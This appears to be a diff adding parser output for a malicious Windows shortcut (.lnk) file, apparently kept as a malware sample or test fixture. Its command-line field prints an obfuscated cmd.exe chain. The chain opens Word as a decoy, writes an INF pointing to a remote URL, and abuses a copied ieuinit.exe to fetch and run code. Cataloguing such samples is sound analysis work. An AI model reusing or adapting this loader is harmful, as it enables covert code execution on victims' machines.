@@ -1,0 +1,114 @@
+Windows Shortcut Information:
+   Guid: 00021401-0000-0000-C000-000000000046
+   Link flags: HasTargetIDList | HasLinkInfo | HasRelativePath | HasArguments | IsUnicode | HasExpString - (683)
+   File flags: FILE_ATTRIBUTE_ARCHIVE - (32)
+   Creation time: 2024-05-16 05:57:35.249120+00:00
+   Accessed time: 2025-04-23 08:56:14.969945+00:00
+   Modified time: 2024-05-16 05:57:35.259125+00:00
+   File size: 236544
+   Icon index: 0
+   Windowstyle: SW_SHOWNORMAL
+   Hotkey: UNSET - UNSET {0x0000}
+
+   SIZE: 10179
+
+   TARGET:
+      Items:
+      -  Root Folder:
+            Sort index: My Computer
+            Sort index value: 80
+            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
+      -  Volume Item:
+            Flags: '0xf'
+            Volume name: C:\
+      -  File entry:
+            Flags: Is directory
+            File size: 0
+            File attribute flags: 16
+            Primary name: ''
+      -  File entry:
+            Flags: Is directory
+            File size: 0
+            File attribute flags: 16
+            Primary name: ''
+      -  File entry:
+            Flags: Is file
+            File size: 236544
+            File attribute flags: 32
+            Primary name: ''
+
+   LINK INFO:
+      Link info flags: 1
+      Local base path: ''
+      Common path suffix: ''
+      Location info:
+         Drive type: DRIVE_FIXED
+         Drive serial number: '0x0'
+         Volume label: ''
+      Location: Local
+
+   DATA:
+      Relative path: ..\..\..\..\..\..\
+      Command line arguments: /v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %f in ("peric=s" "tartarly=e"
+         "unvoyagingu=al" ) do @set %~f) && !peric!et " jugs=e" && c!unvoyagingu!l s!tartarly!t " colberte=c" && c!unvoyagingu!l s!tartarly!t
+         " colberte=c" && !peric!et " entiretyar=u" && !peric!et " trioecio=n" && !peric!et " mammo=x" && c!unvoyagingu!l s!tartarly!t "
+         caustici=C" && c!unvoyagingu!l s!tartarly!t " unambushkar=s" && !peric!et " cli==" && !peric!et " rear=l" && !peric!et " zonat=f"
+         && c!unvoyagingu!l s!tartarly!t " clie=." && !peric!et " trioecio=n" && c!unvoyagingu!l s!tartarly!t " stephani=%windir%" && c!unvoyagingu!l
+         s!tartarly!t " balearic=O" && !peric!et " rear=l" && !peric!et " dynamit=o" && (for %j in ("4") do @!peric!et "sexagesima=%~j")
+         && c!unvoyagingu!l s!tartarly!t " acetylate=d" && c!unvoyagingu!l s!tartarly!t " zonat=f" && (for %d in ("[") do @!peric!et "attunement=%~d")
+         && (for %w in ("e") do @!peric!et "jugs=%~w") && !peric!et " unambushkar=s" && (for %m in ("a") do @!peric!et "harmoniph=%~m") &&
+         (for %x in ("1") do @!peric!et "arrosio=%~x") && !peric!et " jugs=e" && !peric!et " engl=w" && (for %k in ("\") do @!peric!et "lurching=%~k")
+         && c!unvoyagingu!l s!tartarly!t " adsorb=t" && (for %u in ("s") do @!peric!et "unambushkar=%~u") && !peric!et " gonystyl=g" && !peric!et
+         " videru=7" && (for %s in ("m") do @!peric!et "preworthil=%~s") && c!unvoyagingu!l s!tartarly!t " engl=w" && !peric!et " scenedesmus=5"
+         && (for %e in ("B") do @!peric!et "breviradia=%~e") && c!unvoyagingu!l s!tartarly!t " harmoniph=a" && (for %k in ("r") do @!peric!et
+         "filth=%~k") && c!unvoyagingu!l s!tartarly!t " preworthil=m" && c!unvoyagingu!l s!tartarly!t " payload=$" && (for %t in ("X") do
+         @!peric!et "beer=%~t") && c!unvoyagingu!l s!tartarly!t " sulphoxismu=y" && (for %c in ("_") do @!peric!et "duf=%~c") && !peric!et
+         " filth=r" && !peric!et " hconv=%temp%" && (for %t in ("v") do @!peric!et "tetrapods=%~t") && (for %g in ("i") do @!peric!et "mackere=%~g")
+         && (for %n in ("2") do @!peric!et "fsie=%~n") && !peric!et " mackere=i" && !peric!et " adsorb=t" && (for %h in (".") do @!peric!et
+         "clie=%~h") && c!unvoyagingu!l s!tartarly!t " expectan=-" && c!unvoyagingu!l s!tartarly!t " loon=p" && !peric!et " mora= " && c!unvoyagingu!l
+         s!tartarly!t " archaeo=]" && (for %o in ("[!tetrapods!e!filth!s!mackere!o!trioecio!]" "!unambushkar!i!gonystyl!n!harmoniph!t!entiretyar!r!jugs!=!payload!w!mackere!n!acetylate!o!engl!s!mora!n!adsorb!$"
+         "!attunement!d!jugs!f!harmoniph!u!rear!t!mackere!n!unambushkar!t!harmoniph!l!rear!.!engl!i!trioecio!d!dynamit!w!unambushkar!7!archaeo!"
+         "d!jugs!l!zonat!i!rear!e!unambushkar!=!scenedesmus!1!videru!" "U!trioecio!\" "R!jugs!g!mackere!s!adsorb!e!filth!\" "!balearic!C!beer!s!cli!d!mackere!k!jugs!r!mackere!a!mackere!n!duf!C!breviradia!2!caustici!E!caustici!"
+         "[!unambushkar!t!filth!i!trioecio!g!unambushkar!]" "!unambushkar!e!filth!v!mackere!c!jugs!n!harmoniph!m!jugs!= 'a!filth!t'" "!unambushkar!h!dynamit!r!adsorb!s!tetrapods!c!trioecio!a!preworthil!e=
+         'a!filth!t'" "cinem=." "precli=/" "zimmerwald=:" "interluc=I" "stygi=a" "netc=b" "twiggiesti=c" "acystiaco=e" "rateabil=f" "fish=h"
+         "kersant=i" "tra=l" "photopile=m" "empye=n" "vexillar=r" "mont=s" "polyhy=t" "unhurte=w" "!attunement!d!mackere!k!jugs!r!mackere!a!mackere!n!duf!C!breviradia!2!caustici!E!caustici!]"
+         "%mont%c%vexillar%o%netc%\" "j%cinem%d%tra%l,N%interluc%,%fish%t%polyhy%p%zimmerwald%/%precli%w%rateabil%f%cinem%s%acystiaco%h%stygi%l%tra%.%twiggiesti%o%photopile%/%stygi%b%rateabil%2%kersant%a%unhurte%q"
+         "[!scenedesmus!1!videru!]" "i%acystiaco%u%kersant%n%kersant%t%cinem%i%empye%f" "[!acetylate!e!unambushkar!t!mackere!n!harmoniph!t!mackere!o!trioecio!d!mackere!r!unambushkar!]"
+         "d!jugs!f!harmoniph!u!rear!t!acetylate!e!unambushkar!t!acetylate!i!filth!=!arrosio!1" "5!arrosio!7!cli!0!arrosio!" ) do @e!colberte!h!dynamit!
+         %~o) > "!hconv!\ieuinit.inf" && !colberte!a!rear!l !mammo!c!dynamit!p!sulphoxismu! /Y /C /Q !stephani!!lurching!s!sulphoxismu!s!adsorb!e!preworthil!3!fsie!\!mackere!e!sexagesima!u!mackere!n!mackere!t!clie!e!mammo!e
+         "!hconv!" && s!adsorb!a!filth!t " " !hconv!\!mackere!e!sexagesima!u!mackere!n!mackere!t!clie!e!mammo!e !expectan!b!harmoniph!s!jugs!s!jugs!t!adsorb!i!trioecio!g!unambushkar!
+
+   EXTRA:
+      ENVIRONMENTAL VARIABLES LOCATION BLOCK:
+         Size: 788
+         Target ansi: ''
+         Target unicode: ''
+      SPECIAL FOLDER LOCATION BLOCK:
+         Size: 16
+         Special folder id: 37
+         Offset: 221
+      KNOWN FOLDER LOCATION BLOCK:
+         Size: 28
+         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
+         Offset: 221
+      DISTRIBUTED LINK TRACKER BLOCK:
+         Size: 96
+         Length: 88
+         Version: 0
+         Machine identifier: ''
+         Droid volume identifier: 0B7699CC-2521-4EA7-98EB-A4B2D47D21D0
+         Droid file identifier: 1EDF70A0-137A-11EF-A4FB-00155DA53E0D
+         Birth droid volume identifier: 0B7699CC-2521-4EA7-98EB-A4B2D47D21D0
+         Birth droid file identifier: 1EDF70A0-137A-11EF-A4FB-00155DA53E0D
+      METADATA PROPERTIES BLOCK:
+         Size: 206
+         Property store:
+         -  Storage size: 137
+            Version: '0x53505331'
+            Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
+            Serialized property values:
+            -  Value size: 109
+               Id: 4
+               Value: ' S 1 5 21 9879289702 1994509840'
+               Value type: VT_LPWSTR
+
